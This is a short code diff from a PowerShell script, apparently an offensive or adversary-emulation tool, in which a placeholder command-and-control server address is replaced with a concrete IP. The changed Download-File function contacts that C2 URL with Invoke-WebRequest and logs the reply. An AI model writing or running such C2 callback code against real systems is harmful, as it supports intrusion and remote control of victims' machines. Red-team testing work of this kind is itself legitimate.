@@ -44,7 +44,7 @@ function Query-Domains {
 }
 
 function Download-File {
-    $c2Server = "http://11.11.11.11:5000/c2" #Change the IP address (C2 Server)
+    $c2Server = "http://198.18.128.188:5000/c2"
     try {
         $response = Invoke-WebRequest -Uri $c2Server -UseBasicParsing
         Write-Log -Message "C2 server response: $($response.StatusCode)" -Level "DEBUG"
